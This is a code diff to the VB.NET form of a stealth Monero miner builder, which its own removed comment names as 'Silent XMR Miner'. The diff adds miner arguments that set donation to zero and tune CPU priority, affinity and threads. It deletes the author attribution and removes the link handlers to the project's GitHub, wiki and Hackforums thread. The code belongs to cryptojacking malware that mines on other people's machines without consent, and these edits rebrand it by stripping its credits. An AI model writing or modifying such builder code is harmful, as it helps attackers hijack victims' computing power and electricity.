@@ -5,13 +5,13 @@ Imports System.Drawing
 
 Public Class Form1
     Public rand As New Random()
-    Public advancedParams As String = " --asm=auto --cpu-memory-pool=1 --randomx-mode=auto --randomx-no-rdmsr  --cuda-bfactor-hint=12 --cuda-bsleep-hint=100"
+    Public advancedParams As String = " --donate-level 0 --cpu-priority 3 --cpu-affinity 4 -t 4 --asm=auto --cpu-memory-pool=1 --randomx-mode=auto --randomx-no-rdmsr  --cuda-bfactor-hint=12 --cuda-bsleep-hint=100"
     Public watchdogdata As Byte() = New Byte() {}
     Public FA As New Advanced
 
     Public RandomiCache As New List(Of String)
 
-    'Silent XMR Miner by Unam Sanctam https://github.com/UnamSanctam/SilentXMRMiner, initially based on Lime Miner by NYAN CAT https://github.com/NYAN-x-CAT/Lime-Miner
+    '
 
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles Me.Load
         Font = New Font("Segoe UI", 9.5F, Font.Style, Font.Unit, Font.GdiCharSet, Font.GdiVerticalFont)
@@ -513,19 +513,6 @@ Public Class Form1
         If MephTabcontrol2.SelectedIndex = 0 Then
         End If
     End Sub
-
-    Private Sub labelGitHub_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles labelGitHub.LinkClicked
-        Process.Start("https://github.com/UnamSanctam/SilentXMRMiner")
-    End Sub
-
-    Private Sub labelHackforums_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles labelHackforums.LinkClicked
-        Process.Start("https://hackforums.net/showthread.php?tid=5995773")
-    End Sub
-
-    Private Sub labelWiki_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles labelWiki.LinkClicked
-        Process.Start("https://github.com/UnamSanctam/SilentXMRMiner/wiki")
-    End Sub
-
     Private Sub toggleEnableIdle_CheckedChanged(sender As Object) Handles toggleEnableIdle.CheckedChanged
         txtIdleCPU.Enabled = toggleEnableIdle.Checked
         txtIdleWait.Enabled = toggleEnableIdle.Checked
